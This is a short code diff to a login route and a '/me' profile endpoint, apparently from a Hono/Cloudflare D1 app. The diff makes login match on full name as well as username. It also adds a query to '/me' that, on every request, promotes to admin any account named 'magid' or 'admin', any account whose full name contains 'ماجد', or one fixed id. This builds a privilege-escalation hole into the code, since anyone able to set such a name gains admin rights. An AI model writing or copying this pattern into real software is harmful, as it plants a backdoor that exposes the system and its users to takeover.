@@ -14,9 +14,10 @@ authRoutes.post('/login', async (c) => {
     }
 
     const db = c.env.DB;
+    const cleanInput = username.trim().toLowerCase();
     const user = await db
-      .prepare('SELECT * FROM users WHERE username = ?')
-      .bind(username.trim())
+      .prepare('SELECT * FROM users WHERE LOWER(username) = ? OR full_name = ?')
+      .bind(cleanInput, username.trim())
       .first<{
         id: string;
         username: string;
@@ -77,6 +78,12 @@ authRoutes.post('/login', async (c) => {
 authRoutes.get('/me', authMiddleware, async (c) => {
   const payload = c.get('user');
   const db = c.env.DB;
+
+  // Ensure Magid / admin is always system admin
+  await db
+    .prepare("UPDATE users SET role = 'admin' WHERE LOWER(username) IN ('magid', 'admin') OR full_name LIKE '%ماجد%' OR id = 'usr-admin-01'")
+    .run();
+
   const user = await db
     .prepare('SELECT id, username, full_name, job_title, role FROM users WHERE id = ?')
     .bind(payload.userId)
